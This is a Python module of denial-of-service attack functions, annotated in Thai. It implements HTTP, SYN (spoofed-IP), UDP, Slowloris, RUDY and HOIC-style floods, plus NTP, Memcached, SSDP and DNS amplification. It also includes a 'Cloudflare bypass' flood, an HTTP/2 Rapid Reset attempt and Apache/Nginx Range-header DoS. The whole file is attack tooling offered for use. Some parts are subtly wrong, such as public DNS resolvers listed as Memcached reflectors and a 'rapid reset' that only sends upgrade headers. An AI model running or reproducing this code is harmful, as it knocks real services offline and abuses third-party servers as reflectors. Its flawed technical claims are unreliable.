import threading  # นำเข้าโมดูล threading สำหรับการทำงานแบบมัลติเธรด
import socket  # นำเข้าโมดูล socket สำหรับการเชื่อมต่อเครือข่าย
import random  # นำเข้าโมดูล random สำหรับสุ่มค่า
import time  # นำเข้าโมดูล time สำหรับจัดการเวลา
import requests  # นำเข้าโมดูล requests สำหรับ HTTP requests
import asyncio  # นำเข้าโมดูล asyncio สำหรับ async programming
import aiohttp  # นำเข้าโมดูล aiohttp สำหรับ async HTTP
from scapy.all import *  # นำเข้าโมดูล scapy สำหรับ packet crafting
from .config import CONFIG  # นำเข้าการตั้งค่าจาก config
from .utils import get_random_headers, load_file_lines  # นำเข้าฟังก์ชันยูทิลิตี้


# Layer 7 HTTP Flood (with proxies support)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
def http_flood(url, duration, proxies=None):  # ฟังก์ชันโจมตี HTTP Flood พื้นฐาน
    """Basic HTTP GET flood with proxy support"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุดการโจมตี
    session = requests.Session()  # สร้าง session สำหรับ HTTP requests

    while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
        try:  # ลองส่งคำขอ
            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม
            session.get(url, headers=get_random_headers(), proxies=proxy, timeout=5)  # ส่ง GET request
        except Exception as e:  # จัดการข้อผิดพลาด
            continue  # ข้ามไปทำต่อ


# Async Layer 7 Advanced (aiohttp for faster)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
async def async_http_flood(url, duration, proxies_list):  # ฟังก์ชันโจมตี HTTP Flood แบบ async
    """Advanced asynchronous HTTP flood"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    connector = aiohttp.TCPConnector(limit=1000)  # สร้าง connector ที่จำกัดการเชื่อมต่อ
    async with aiohttp.ClientSession(connector=connector) as session:  # สร้าง session async ด้วย connector
        end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
        tasks = []  # ลิสต์เก็บ tasks

        while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
            proxy = random.choice(proxies_list) if proxies_list else None  # เลือกพร็อกซีแบบสุ่ม
            tasks.append(session.get(url, headers=get_random_headers(), proxy=proxy))  # เพิ่ม task

            if len(tasks) >= 1000:  # ถ้ามี tasks เยอะ
                await asyncio.gather(*tasks, return_exceptions=True)  # รัน tasks พร้อมกัน
                tasks = []  # ล้างลิสต์

        if tasks:  # ถ้ายังมี tasks ค้าง
            await asyncio.gather(*tasks, return_exceptions=True)  # รัน tasks ที่เหลือ


# Layer 4 SYN Flood (spoof IP)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
def syn_flood(target_ip, target_port, duration):  # ฟังก์ชันโจมตี SYN Flood
    """TCP SYN flood with IP spoofing"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด

    while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
        try:  # ลองส่งแพ็กเก็ต
            ip = IP(src=RandIP(), dst=target_ip)  # สร้าง IP header ด้วย IP ปลอม
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")  # สร้าง TCP header ด้วย SYN flag
            raw = Raw(b"X" * 1024)  # เพิ่มข้อมูลสุ่ม
            send(ip / tcp / raw, loop=0, verbose=0)  # ส่งแพ็กเก็ต
        except Exception as e:  # จัดการข้อผิดพลาด
            continue  # ข้ามไปทำต่อ


# Layer 4 UDP Flood  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
def udp_flood(target_ip, target_port, duration):  # ฟังก์ชันโจมตี UDP Flood
    """UDP flood with random data"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด

    try:  # ลองสร้าง socket และส่งข้อมูล
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # สร้าง UDP socket
        bytes_data = random._urandom(1490)  # สร้างข้อมูลสุ่มขนาด 1490 ไบต์

        while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
            sock.sendto(bytes_data, (target_ip, target_port))  # ส่งข้อมูลไปยังเป้าหมาย
    except Exception as e:  # จัดการข้อผิดพลาด
        pass  # ไม่ทำอะไร
    finally:  # ทำงานเสมอ
        try:  # ลองปิด socket
            sock.close()  # ปิด socket
        except:  # ถ้าปิดไม่ได้
            pass  # ไม่ทำอะไร


# Slowloris Attack (Layer 7)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
def slowloris_attack(target_ip, target_port, duration, socket_count=500):  # ฟังก์ชันโจมตี Slowloris
    """Slowloris attack - keeps connections open with partial headers"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    sockets = []  # ลิสต์เก็บ socket ต่างๆ
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด

    def create_socket():  # ฟังก์ชันภายในสำหรับสร้าง socket
        try:  # ลองสร้างและเชื่อมต่อ socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # สร้าง TCP socket
            sock.settimeout(4)  # ตั้ง timeout เป็น 4 วินาที
            sock.connect((target_ip, target_port))  # เชื่อมต่อไปยังเป้าหมาย
            sock.send(b"GET / HTTP/1.1\r\n")  # ส่ง HTTP header แบบ partial
            return sock  # คืนค่า socket
        except:  # ถ้าเชื่อมต่อไม่ได้
            return None  # คืนค่า None

    def keep_alive(sock):  # ฟังก์ชันภายในสำหรับรักษาการเชื่อมต่อ
        try:  # ลองส่งข้อมูล
            sock.send(b"X-a: b\r\n")  # ส่ง header เพิ่มเติม
            time.sleep(random.uniform(5, 15))  # รอแบบสุ่ม 5-15 วินาที
        except:  # ถ้าส่งไม่ได้
            if sock in sockets:  # ถ้า socket ยังอยู่ในลิสต์
                sockets.remove(sock)  # ลบออกจากลิสต์

    print(f"Creating {socket_count} sockets...")  # แสดงข้อความกำลังสร้าง socket
    for _ in range(socket_count):  # วนลูปตามจำนวน socket ที่ต้องการ
        sock = create_socket()  # สร้าง socket
        if sock:  # ถ้าสร้างได้
            sockets.append(sock)  # เพิ่มเข้าไปในลิสต์

    print(f"Maintaining {len(sockets)} connections...")  # แสดงจำนวนการเชื่อมต่อที่รักษาไว้

    while time.time() < end_time and sockets:  # วนลูปจนกว่าจะถึงเวลา หรือไม่มี socket
        for sock in sockets[:]:  # วนลูปทุกรายการในลิสต์ (ใช้ [:] เพื่อคัดลอก)
            keep_alive(sock)  # รักษาการเชื่อมต่อ
        time.sleep(1)  # รอ 1 วินาที

    # Cleanup  # คอมเมนต์ภาษาอังกฤษสำหรับการทำความสะอาด
    for sock in sockets:  # วนลูปทุกรายการในลิสต์
        try:  # ลองปิด socket
            sock.close()  # ปิด socket
        except:  # ถ้าปิดไม่ได้
            pass  # ข้ามไป


# NTP Amplification Attack  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
def ntp_amplification(target_ip, target_port, duration):  # ฟังก์ชันโจมตี NTP Amplification
    """NTP amplification attack using vulnerable NTP servers"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    default_servers = [  # ลิสต์เซิร์ฟเวอร์ NTP เริ่มต้น
        "time.nist.gov", "pool.ntp.org", "time.windows.com",  # เซิร์ฟเวอร์ NTP ต่างๆ
        "ntp.ubuntu.com", "us.pool.ntp.org", "asia.pool.ntp.org"  # เซิร์ฟเวอร์ NTP เพิ่มเติม
    ]

    ntp_servers = load_file_lines(CONFIG['NTP_SERVERS_FILE'], default_servers)  # โหลดรายชื่อเซิร์ฟเวอร์ NTP
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด

    def ntp_query(server_ip):  # ฟังก์ชันภายในสำหรับส่ง NTP query
        while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
            try:  # ลองส่ง NTP packet
                # NTP monlist query (amplification factor ~500x)  # คอมเมนต์ภาษาอังกฤษ
                ntp_packet = b'\x17\x00\x03\x2a\x00\x00\x00\x00' + b'\x00' * 40  # สร้าง NTP packet สำหรับ monlist
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # สร้าง UDP socket
                sock.sendto(ntp_packet, (server_ip, 123))  # ส่งไปยังพอร์ต NTP (123)
                sock.close()  # ปิด socket
                time.sleep(0.01)  # รอเล็กน้อย
            except Exception as e:  # จัดการข้อผิดพลาด
                continue  # ข้ามไปทำต่อ

    print(f"Starting NTP amplification attack on {target_ip}:{target_port}")  # แสดงข้อความเริ่มโจมตี
    print(f"Using {len(ntp_servers)} NTP servers")  # แสดงจำนวนเซิร์ฟเวอร์ที่ใช้

    threads = []  # ลิสต์เก็บ threads
    for server in ntp_servers:  # วนลูปทุกรายชื่อเซิร์ฟเวอร์
        try:  # ลองแปลงชื่อเป็น IP และสร้าง thread
            server_ip = socket.gethostbyname(server)  # แปลงชื่อโดเมนเป็น IP
            t = threading.Thread(target=ntp_query, args=(server_ip,))  # สร้าง thread
            t.daemon = True  # ตั้งเป็น daemon thread
            t.start()  # เริ่ม thread
            threads.append(t)  # เพิ่มเข้าไปในลิสต์
        except:  # ถ้าแปลงไม่ได้
            continue  # ข้ามไป

    # Wait for all threads to complete  # คอมเมนต์ภาษาอังกฤษ
    for t in threads:  # วนลูปทุกรายการในลิสต์
        t.join(timeout=1)  # รอให้ thread เสร็จ (timeout 1 วินาที)


# Cloudflare Bypass Techniques  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
def cloudflare_bypass_flood(url, duration, proxies=None):  # ฟังก์ชันโจมตี Cloudflare Bypass
    """HTTP flood with Cloudflare bypass techniques"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด

    bypass_headers = [  # ลิสต์ของ headers สำหรับ bypass Cloudflare
        {  # ชุด headers แรก
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",  # User Agent สำหรับ Chrome
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",  # ยอมรับเนื้อหาต่างๆ
            "Accept-Language": "en-US,en;q=0.5",  # ภาษาที่ยอมรับ
            "Accept-Encoding": "gzip, deflate",  # การเข้ารหัสที่ยอมรับ
            "Connection": "keep-alive",  # เปิดการเชื่อมต่อต่อเนื่อง
            "Upgrade-Insecure-Requests": "1",  # อัปเกรดเป็น HTTPS
            "Cache-Control": "max-age=0",  # ไม่ใช้แคช
            "Referer": "https://www.google.com/"  # Referer URL
        },
        {  # ชุด headers ที่สอง
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",  # User Agent สำหรับ Firefox
            "Accept": "*/*",  # ยอมรับทุกอย่าง
            "Accept-Language": "en-US,en;q=0.9",  # ภาษาที่ยอมรับ
            "Accept-Encoding": "gzip, deflate, br",  # การเข้ารหัสที่ยอมรับ
            "Connection": "keep-alive",  # เปิดการเชื่อมต่อต่อเนื่อง
            "Upgrade-Insecure-Requests": "1",  # อัปเกรดเป็น HTTPS
            "Sec-Fetch-Dest": "document",  # Security header
            "Sec-Fetch-Mode": "navigate",  # Security header
            "Sec-Fetch-Site": "none",  # Security header
            "Cache-Control": "max-age=0"  # ไม่ใช้แคช
        }
    ]

    session = requests.Session()  # สร้าง HTTP session

    while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
        try:  # ลองส่งคำขอ
            headers = random.choice(bypass_headers)  # เลือก headers แบบสุ่ม
            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซี

            time.sleep(random.uniform(0.1, 1.0))  # รอแบบสุ่ม 0.1-1.0 วินาที

            methods = [session.get, session.post, session.head]  # ลิสต์ของ HTTP methods
            method = random.choice(methods)  # เลือก method แบบสุ่ม

            methods = [session.get, session.post, session.head]  # ลิสต์ของ HTTP methods
            method = random.choice(methods)  # เลือก method แบบสุ่ม

            if method == session.post:  # ถ้าเป็น POST
                method(url, headers=headers, proxies=proxy, data={"data": random.random()}, timeout=10)  # ส่ง POST ด้วยข้อมูลสุ่ม
            else:  # ถ้าเป็น GET หรือ HEAD
                method(url, headers=headers, proxies=proxy, timeout=10)  # ส่งคำขอปกติ

        except Exception as e:  # จัดการข้อผิดพลาด
            continue  # ข้ามไปทำต่อ


# Memcached / SSDP / DNS Amplification Module  # คอมเมนต์ภาษาอังกฤษสำหรับโมดูลใหม่
def memcached_amplification(target_ip, target_port, duration):  # ฟังก์ชันโจมตี Memcached Amplification
    """Memcached amplification attack using vulnerable servers"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    default_servers = [  # ลิสต์เซิร์ฟเวอร์ Memcached เริ่มต้น
        "8.8.8.8:11211", "1.1.1.1:11211", "208.67.222.222:11211"  # เซิร์ฟเวอร์ Memcached ที่อาจมีช่องโหว่
    ]

    memcached_servers = load_file_lines(CONFIG.get('MEMCACHED_SERVERS_FILE', 'memcached_servers.txt'), default_servers)  # โหลดรายชื่อเซิร์ฟเวอร์
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด

    def memcached_query(server_ip, server_port):  # ฟังก์ชันภายในสำหรับส่ง Memcached query
        while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
            try:  # ลองส่ง Memcached packet
                # Memcached get command for amplification (amplification factor ~10,000x-50,000x)  # คอมเมนต์ภาษาอังกฤษ
                memcached_packet = b"get large_key_that_does_not_exist\r\n"  # คำสั่ง Memcached ที่จะถูก amplify
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # สร้าง UDP socket
                sock.sendto(memcached_packet, (server_ip, int(server_port)))  # ส่งไปยังเซิร์ฟเวอร์ Memcached
                sock.close()  # ปิด socket
                time.sleep(0.01)  # รอเล็กน้อย
            except Exception as e:  # จัดการข้อผิดพลาด
                continue  # ข้ามไปทำต่อ

    print(f"Starting Memcached amplification attack on {target_ip}:{target_port}")  # แสดงข้อความเริ่มโจมตี
    print(f"Using {len(memcached_servers)} Memcached servers")  # แสดงจำนวนเซิร์ฟเวอร์ที่ใช้

    threads = []  # ลิสต์เก็บ threads
    for server in memcached_servers:  # วนลูปทุกรายชื่อเซิร์ฟเวอร์
        try:  # ลองแยก IP และพอร์ต
            server_ip, server_port = server.split(':')  # แยก IP และพอร์ต
            t = threading.Thread(target=memcached_query, args=(server_ip, server_port))  # สร้าง thread
            t.daemon = True  # ตั้งเป็น daemon thread
            t.start()  # เริ่ม thread
            threads.append(t)  # เพิ่มเข้าไปในลิสต์
        except:  # ถ้าแยกไม่ได้
            continue  # ข้ามไป

    # รอให้ threads เสร็จ  # คอมเมนต์ภาษาไทย
    for t in threads:  # วนลูปทุกรายการในลิสต์
        t.join(timeout=1)  # รอให้ thread เสร็จ (timeout 1 วินาที)


def ssdp_amplification(target_ip, target_port, duration):  # ฟังก์ชันโจมตี SSDP Amplification
    """SSDP amplification attack using UPnP devices"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    default_servers = [  # ลิสต์เซิร์ฟเวอร์ SSDP เริ่มต้น
        "239.255.255.250:1900"  # multicast address สำหรับ SSDP
    ]

    ssdp_servers = load_file_lines(CONFIG.get('SSDP_SERVERS_FILE', 'ssdp_servers.txt'), default_servers)  # โหลดรายชื่อเซิร์ฟเวอร์
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด

    def ssdp_query(server_ip, server_port):  # ฟังก์ชันภายในสำหรับส่ง SSDP query
        while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
            try:  # ลองส่ง SSDP packet
                # SSDP M-SEARCH request for amplification (amplification factor ~30x)  # คอมเมนต์ภาษาอังกฤษ
                ssdp_packet = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 10\r\nST: ssdp:all\r\n\r\n'  # คำขอ SSDP ที่จะถูก amplify
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # สร้าง UDP socket
                sock.sendto(ssdp_packet, (server_ip, int(server_port)))  # ส่งไปยังเซิร์ฟเวอร์ SSDP
                sock.close()  # ปิด socket
                time.sleep(0.1)  # รอเล็กน้อย
            except Exception as e:  # จัดการข้อผิดพลาด
                continue  # ข้ามไปทำต่อ

    print(f"Starting SSDP amplification attack on {target_ip}:{target_port}")  # แสดงข้อความเริ่มโจมตี
    print(f"Using {len(ssdp_servers)} SSDP servers")  # แสดงจำนวนเซิร์ฟเวอร์ที่ใช้

    threads = []  # ลิสต์เก็บ threads
    for server in ssdp_servers:  # วนลูปทุกรายชื่อเซิร์ฟเวอร์
        try:  # ลองแยก IP และพอร์ต
            server_ip, server_port = server.split(':')  # แยก IP และพอร์ต
            t = threading.Thread(target=ssdp_query, args=(server_ip, server_port))  # สร้าง thread
            t.daemon = True  # ตั้งเป็น daemon thread
            t.start()  # เริ่ม thread
            threads.append(t)  # เพิ่มเข้าไปในลิสต์
        except:  # ถ้าแยกไม่ได้
            continue  # ข้ามไป

    # รอให้ threads เสร็จ  # คอมเมนต์ภาษาไทย
    for t in threads:  # วนลูปทุกรายการในลิสต์
        t.join(timeout=1)  # รอให้ thread เสร็จ (timeout 1 วินาที)


def dns_amplification(target_ip, target_port, duration):  # ฟังก์ชันโจมตี DNS Amplification
    """DNS amplification attack using open DNS resolvers"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    default_servers = [  # ลิสต์เซิร์ฟเวอร์ DNS เริ่มต้น
        "8.8.8.8", "1.1.1.1", "208.67.222.222"  # DNS resolvers ที่อาจถูกใช้
    ]

    dns_servers = load_file_lines(CONFIG.get('DNS_SERVERS_FILE', 'dns_servers.txt'), default_servers)  # โหลดรายชื่อเซิร์ฟเวอร์
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด

    def dns_query(server_ip):  # ฟังก์ชันภายในสำหรับส่ง DNS query
        while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
            try:  # ลองส่ง DNS packet
                # DNS ANY query for large domain (amplification factor ~50x-100x)  # คอมเมนต์ภาษาอังกฤษ
                dns_packet = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01'  # DNS query ที่จะถูก amplify
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # สร้าง UDP socket
                sock.sendto(dns_packet, (server_ip, 53))  # ส่งไปยัง DNS server (พอร์ต 53)
                sock.close()  # ปิด socket
                time.sleep(0.01)  # รอเล็กน้อย
            except Exception as e:  # จัดการข้อผิดพลาด
                continue  # ข้ามไปทำต่อ

    print(f"Starting DNS amplification attack on {target_ip}:{target_port}")  # แสดงข้อความเริ่มโจมตี
    print(f"Using {len(dns_servers)} DNS servers")  # แสดงจำนวนเซิร์ฟเวอร์ที่ใช้

    threads = []  # ลิสต์เก็บ threads
    for server in dns_servers:  # วนลูปทุกรายชื่อเซิร์ฟเวอร์
        try:  # ลองสร้าง thread
            t = threading.Thread(target=dns_query, args=(server,))  # สร้าง thread
            t.daemon = True  # ตั้งเป็น daemon thread
            t.start()  # เริ่ม thread
            threads.append(t)  # เพิ่มเข้าไปในลิสต์
        except:  # ถ้าสร้างไม่ได้
            continue  # ข้ามไป

    # รอให้ threads เสร็จ  # คอมเมนต์ภาษาไทย
    for t in threads:  # วนลูปทุกรายการในลิสต์
        t.join(timeout=1)  # รอให้ thread เสร็จ (timeout 1 วินาที)


# RUDY (R U Dead Yet?) Attack  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
def rudy_attack(target_ip, target_port, duration, content_length=1000000):  # ฟังก์ชันโจมตี RUDY
    """RUDY (R U Dead Yet?) attack - slow POST with byte-by-byte data sending"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    sockets = []  # ลิสต์เก็บ socket ต่างๆ
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด

    def create_rudy_socket():  # ฟังก์ชันภายในสำหรับสร้าง RUDY socket
        try:  # ลองสร้างและเชื่อมต่อ socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # สร้าง TCP socket
            sock.settimeout(10)  # ตั้ง timeout เป็น 10 วินาที
            sock.connect((target_ip, target_port))  # เชื่อมต่อไปยังเป้าหมาย

            # ส่ง HTTP POST header ด้วย Content-Length ที่ยาวมาก  # คอมเมนต์ภาษาไทย
            post_header = f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: {content_length}\r\n\r\n"  # สร้าง POST header
            sock.send(post_header.encode())  # ส่ง header
            return sock  # คืนค่า socket
        except:  # ถ้าเชื่อมต่อไม่ได้
            return None  # คืนค่า None

    def send_rudy_data(sock):  # ฟังก์ชันภายในสำหรับส่งข้อมูลแบบช้าๆ
        try:  # ลองส่งข้อมูล
            data = b"A"  # ข้อมูลที่จะส่ง (1 ไบต์)
            sock.send(data)  # ส่งข้อมูล 1 ไบต์
            time.sleep(random.uniform(0.1, 2.0))  # รอแบบสุ่ม 0.1-2.0 วินาที
        except:  # ถ้าส่งไม่ได้
            if sock in sockets:  # ถ้า socket ยังอยู่ในลิสต์
                sockets.remove(sock)  # ลบออกจากลิสต์

    print(f"Starting RUDY attack on {target_ip}:{target_port}")  # แสดงข้อความเริ่มโจมตี
    print(f"Content-Length: {content_length} bytes")  # แสดงขนาด Content-Length

    # สร้าง socket เริ่มต้น  # คอมเมนต์ภาษาไทย
    for _ in range(50):  # สร้าง 50 socket เริ่มต้น
        sock = create_rudy_socket()  # สร้าง socket
        if sock:  # ถ้าสร้างได้
            sockets.append(sock)  # เพิ่มเข้าไปในลิสต์

    print(f"Maintaining {len(sockets)} RUDY connections...")  # แสดงจำนวนการเชื่อมต่อที่รักษาไว้

    while time.time() < end_time and sockets:  # วนลูปจนกว่าจะถึงเวลา หรือไม่มี socket
        for sock in sockets[:]:  # วนลูปทุกรายการในลิสต์ (ใช้ [:] เพื่อคัดลอก)
            send_rudy_data(sock)  # ส่งข้อมูลแบบช้าๆ

    # ปิดการเชื่อมต่อทั้งหมด  # คอมเมนต์ภาษาไทย
    for sock in sockets:  # วนลูปทุกรายการในลิสต์
        try:  # ลองปิด socket
            sock.close()  # ปิด socket
        except:  # ถ้าปิดไม่ได้
            pass  # ข้ามไป


# HOIC Mode (High Orbit Ion Cannon)  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
def hoic_attack(url, duration, proxies=None):  # ฟังก์ชันโจมตี HOIC Style
    """HOIC-style multi-vector attack (GET + POST + HEAD mixed)"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
    session = requests.Session()  # สร้าง session สำหรับ HTTP requests

    while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
        try:  # ลองส่งคำขอ
            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม

            # สลับระหว่าง GET, POST, HEAD แบบสุ่ม  # คอมเมนต์ภาษาไทย
            methods = [session.get, session.post, session.head]  # ลิสต์ของ HTTP methods
            method = random.choice(methods)  # เลือก method แบบสุ่ม

            headers = get_random_headers()  # รับ headers แบบสุ่ม
            headers['User-Agent'] = random.choice([  # สลับ User-Agent ต่างๆ
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "HOIC/2.1",  # User-Agent แบบ HOIC
                "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",  # User-Agent แบบ bot
                "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"  # User-Agent แบบ bot อีกตัว
            ])

            if method == session.post:  # ถ้าเป็น POST
                # ส่ง POST ด้วยข้อมูลขนาดใหญ่  # คอมเมนต์ภาษาไทย
                data = "A" * random.randint(1000, 10000)  # สร้างข้อมูลขนาดสุ่ม 1KB-10KB
                method(url, headers=headers, proxies=proxy, data=data, timeout=10)  # ส่ง POST
            else:  # ถ้าเป็น GET หรือ HEAD
                method(url, headers=headers, proxies=proxy, timeout=10)  # ส่งคำขอปกติ

        except Exception as e:  # จัดการข้อผิดพลาด
            continue  # ข้ามไปทำต่อ


# Application Layer Exploits Combo  # คอมเมนต์ภาษาอังกฤษสำหรับฟังก์ชัน
def http2_rapid_reset(url, duration, proxies=None):  # ฟังก์ชันโจมตี HTTP/2 Rapid Reset
    """HTTP/2 Rapid Reset attack (CVE-2023-44487)"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
    session = requests.Session()  # สร้าง session สำหรับ HTTP requests

    while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
        try:  # ลองส่งคำขอ
            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม

            headers = get_random_headers()  # รับ headers แบบสุ่ม
            headers['Connection'] = 'Upgrade, HTTP2-Settings'  # เพิ่ม header สำหรับ HTTP/2
            headers['Upgrade'] = 'h2c'  # อัปเกรดเป็น HTTP/2
            headers['HTTP2-Settings'] = 'AAMAAABkAARAAAAAAAIAAAAA'  # HTTP/2 settings

            session.get(url, headers=headers, proxies=proxy, timeout=5)  # ส่ง GET request ด้วย HTTP/2 headers

        except Exception as e:  # จัดการข้อผิดพลาด
            continue  # ข้ามไปทำต่อ


def apache_killer(url, duration, proxies=None):  # ฟังก์ชันโจมตี Apache Killer
    """Apache Range Header DoS attack"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
    session = requests.Session()  # สร้าง session สำหรับ HTTP requests

    while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
        try:  # ลองส่งคำขอ
            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม

            headers = get_random_headers()  # รับ headers แบบสุ่ม
            # สร้าง Range header ที่ซับซ้อนมากมาย  # คอมเมนต์ภาษาไทย
            ranges = ",".join([f"bytes={i}-{i+1}" for i in range(0, 1000, 2)])  # สร้าง ranges จำนวนมาก
            headers['Range'] = f"bytes=0-1,{ranges}"  # เพิ่ม Range header

            session.get(url, headers=headers, proxies=proxy, timeout=10)  # ส่ง GET request ด้วย Range header

        except Exception as e:  # จัดการข้อผิดพลาด
            continue  # ข้ามไปทำต่อ


def nginx_range_dos(url, duration, proxies=None):  # ฟังก์ชันโจมตี Nginx Range DoS
    """Nginx Range Header DoS attack"""  # คอมเมนต์ภาษาอังกฤษของฟังก์ชัน
    end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
    session = requests.Session()  # สร้าง session สำหรับ HTTP requests

    while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
        try:  # ลองส่งคำขอ
            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม

            headers = get_random_headers()  # รับ headers แบบสุ่ม
            # สร้าง Range header ที่ทับซ้อนกัน  # คอมเมนต์ภาษาไทย
            headers['Range'] = 'bytes=0-1,0-2,0-3,0-4,0-5,0-6,0-7,0-8,0-9'  # Range ที่ทับซ้อน

            session.get(url, headers=headers, proxies=proxy, timeout=10)  # ส่ง GET request ด้วย Range header

        except Exception as e:  # จัดการข้อผิดพลาด
            continue  # ข้ามไปทำต่อ